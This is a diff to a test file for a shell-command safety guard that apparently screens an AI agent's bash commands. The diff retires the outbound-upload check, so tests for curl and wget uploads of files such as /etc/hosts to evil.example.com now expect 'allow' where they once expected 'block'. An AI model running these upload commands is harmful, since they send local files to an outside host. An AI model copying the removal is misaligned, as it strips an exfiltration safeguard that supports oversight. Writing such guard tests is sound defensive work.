@@ -84,30 +84,30 @@ describe("guard 回放·日常抽样——守卫零感知", () => {
   }
 });
 
-describe("guard 回放·B 类域名表语义（config.yaml bashGuard.allowedEgressDomains）", () => {
-  it("配置表内域名 POST 放行（后缀匹配含子域）", () => {
-    const block = checkBashCommandSafety(
-      "curl -X POST https://api.github.com/repos/x/y/issues -d '{\"title\":\"t\"}'",
-      FAKE_MAIN_PID, undefined,
-      { projectRoot, processProbe: { whoListens: () => null, identity: () => null }, allowedEgressDomains: ["github.com"] },
-    );
-    expect(block).toBeNull();
-  });
-  it("配置表外域名 POST 拦（非协作域名 fail-closed）", () => {
+describe("guard 回放·B 类外发判定已退役（F20261109bexfz）——POST/PUT 不再看目的地", () => {
+  it("非协作域名 POST 带数据放行（白名单语义已删）", () => {
     const block = checkBashCommandSafety(
       "curl -X POST https://evil.example.com -d '{\"x\":1}'",
       FAKE_MAIN_PID, undefined,
-      { projectRoot, processProbe: { whoListens: () => null, identity: () => null }, allowedEgressDomains: ["github.com"] },
+      { projectRoot, processProbe: { whoListens: () => null, identity: () => null } },
     );
-    expect(block?.text).toContain("上传");
+    expect(block).toBeNull();
   });
-  it("显式空数组 = fail-closed（内置缺省表不回退）", () => {
-    const block = checkBashCommandSafety(
-      "curl -X POST https://api.github.com/repos/x/y/issues -d '{\"title\":\"t\"}'",
-      FAKE_MAIN_PID, undefined,
-      { projectRoot, processProbe: { whoListens: () => null, identity: () => null }, allowedEgressDomains: [] },
-    );
-    expect(block?.text).toContain("上传");
+  it("allowedEgressDomains 兼容参数静默忽略（显式传表不再影响判定）", () => {
+    // 双向对照：传允许域名表与传空表（原 fail-closed 语义）结果相同——字段不参与判定
+    const probe = { whoListens: () => null, identity: () => null };
+    const cmd = "curl -X POST https://api.github.com/repos/x/y/issues -d '{\"title\":\"t\"}'";
+    const withAllowList = checkBashCommandSafety(cmd, FAKE_MAIN_PID, undefined, {
+      projectRoot, processProbe: probe, allowedEgressDomains: ["github.com"],
+    });
+    const withDenyAllList = checkBashCommandSafety(cmd, FAKE_MAIN_PID, undefined, {
+      projectRoot, processProbe: probe, allowedEgressDomains: [],
+    });
+    expect(withAllowList).toBeNull();
+    expect(withDenyAllList).toBeNull();
+  });
+  it("fail-closed 分支（无 URL 上传动词）随判定退役放行", () => {
+    expect(judge("curl -d @x.txt")).toBe("allow");
   });
 });
 
@@ -119,8 +119,8 @@ describe("guard 回放·检视初轮修复回归钉（S1/S2/S5/S7/③）", () =>
   it("S1: curl -D- 看响应头（GET）放行", () => {
     expect(judge("curl -D- https://evil.example.com -o /dev/null")).toBe("allow");
   });
-  it("S1 反向: curl -F 表单上传（真上传旗标）仍拦", () => {
-    expect(judge("curl -F file=@/tmp/x https://evil.example.com/up")).toBe("block");
+  it("S1 反向: curl -F 表单上传——B 类已退役（F20261109bexfz）放行", () => {
+    expect(judge("curl -F file=@/tmp/x https://evil.example.com/up")).toBe("allow");
   });
   // S2：广播/进程组 kill 保守拦
   it("S2: kill -9 -1（广播）拦", () => {
@@ -130,21 +130,21 @@ describe("guard 回放·检视初轮修复回归钉（S1/S2/S5/S7/③）", () =>
   it("S2: kill -- -1234（进程组）拦", () => {
     expect(judge("kill -- -1234")).toBe("block");
   });
-  // S5：PUT 族动词命中 B 类
-  it("S5: curl -T 上传（PUT 族）拦", () => {
-    expect(judge("curl -T /tmp/x https://evil.example.com/up")).toBe("block");
+  // S5：PUT 族动词——B 类退役后全部放行（F20261109bexfz，历史钉转退役钉）
+  it("S5: curl -T 上传（PUT 族）——退役放行", () => {
+    expect(judge("curl -T /tmp/x https://evil.example.com/up")).toBe("allow");
   });
-  it("S5: curl --upload-file 拦", () => {
-    expect(judge("curl --upload-file /tmp/x https://evil.example.com/up")).toBe("block");
+  it("S5: curl --upload-file——退役放行", () => {
+    expect(judge("curl --upload-file /tmp/x https://evil.example.com/up")).toBe("allow");
   });
-  it("S5: curl --request=POST 拦", () => {
-    expect(judge("curl --request=POST https://evil.example.com -d x=1")).toBe("block");
+  it("S5: curl --request=POST——退役放行", () => {
+    expect(judge("curl --request=POST https://evil.example.com -d x=1")).toBe("allow");
   });
-  it("S5: wget --method=PUT 拦", () => {
-    expect(judge("wget --method=PUT --body-data=x https://evil.example.com/up")).toBe("block");
+  it("S5: wget --method=PUT——退役放行", () => {
+    expect(judge("wget --method=PUT --body-data=x https://evil.example.com/up")).toBe("allow");
   });
-  it("S5: curl --json 拦", () => {
-    expect(judge("curl --json '{\"x\":1}' https://evil.example.com/api")).toBe("block");
+  it("S5: curl --json——退役放行", () => {
+    expect(judge("curl --json '{\"x\":1}' https://evil.example.com/api")).toBe("allow");
   });
   // S7：复合形态不误拦（管道段配对）
   it("S7: 表内 GET | head && cat 本地 | python3——复合形态放行", () => {
@@ -177,12 +177,12 @@ describe("guard 回放·检视初轮修复回归钉（S1/S2/S5/S7/③）", () =>
       fs.rmSync(path.join(projectRoot, ".otter", "allowed-service-ports.json"), { force: true });
     }
   });
-  // D1（delta-r1 检视）：附着值形态上传必须拦（-T<file> / -F<form> / -d@file）
-  it("D1: curl -T<file> 附着值上传拦", () => {
-    expect(judge("curl -T/etc/hosts https://evil.example.com/up")).toBe("block");
+  // D1（delta-r1 检视）：附着值形态——B 类退役后放行（F20261109bexfz）
+  it("D1: curl -T<file> 附着值上传——退役放行", () => {
+    expect(judge("curl -T/etc/hosts https://evil.example.com/up")).toBe("allow");
   });
-  it("D1: curl -F<name>=@<file> 附着值表单上传拦", () => {
-    expect(judge("curl -Ffile=@/etc/hosts https://evil.example.com/up")).toBe("block");
+  it("D1: curl -F<name>=@<file> 附着值表单上传——退役放行", () => {
+    expect(judge("curl -Ffile=@/etc/hosts https://evil.example.com/up")).toBe("allow");
   });
   // D2（delta-r1 检视）：wget -t=--tries / curl -t=telnet-option 是 GET 侧旗标，放行
   it("D2: wget -t 3 纯 GET（重试次数旗标）放行", () => {
@@ -215,11 +215,11 @@ describe("guard 回放·检视初轮修复回归钉（S1/S2/S5/S7/③）", () =>
   it("D3: wget -T 5 -t 3 -O 高频脚本形态放行", () => {
     expect(judge("wget -T 5 -t 3 -O /tmp/f https://evil.example.com/f.tar.gz")).toBe("allow");
   });
-  it("D3 反向: wget --post-data 上传仍拦", () => {
-    expect(judge("wget --post-data=x https://evil.example.com/up")).toBe("block");
+  it("D3 反向: wget --post-data——B 类退役放行（F20261109bexfz）", () => {
+    expect(judge("wget --post-data=x https://evil.example.com/up")).toBe("allow");
   });
-  it("D3 反向: wget --body-file 上传仍拦", () => {
-    expect(judge("wget --body-file=/tmp/x https://evil.example.com/up")).toBe("block");
+  it("D3 反向: wget --body-file——B 类退役放行（F20261109bexfz）", () => {
+    expect(judge("wget --body-file=/tmp/x https://evil.example.com/up")).toBe("allow");
   });
   // D4（delta-r2 检视）：链段判定按数据流
   it("D4: cat <(curl …) | bash 漏判回堵", () => {
